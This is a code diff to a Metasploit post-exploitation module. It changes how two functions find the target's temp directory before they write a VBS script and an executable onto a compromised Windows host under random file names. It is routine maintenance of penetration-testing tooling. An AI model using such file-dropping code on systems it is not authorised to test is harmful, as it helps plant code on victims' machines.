@@ -250,7 +250,7 @@ class Metasploit3 < Msf::Post
   # Function for writing script to target host
   #-------------------------------------------------------------------------------
   def write_script_to_target(vbs)
-    tempdir = session.fs.file.expand_path("%TEMP%")
+    tempdir = session.sys.config.getenv('TEMP')
     tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
     fd = session.fs.file.new(tempvbs, "wb")
     fd.write(vbs)
@@ -352,7 +352,7 @@ class Metasploit3 < Msf::Post
   # Function for writing executable to target host
   #-------------------------------------------------------------------------------
   def write_exe_to_target(vbs,rexename)
-    tempdir = session.fs.file.expand_path("%TEMP%")
+    tempdir = session.sys.config.getenv('TEMP')
     tempvbs = tempdir + "\\" + rexename
     fd = session.fs.file.new(tempvbs, "wb")
     fd.write(vbs)
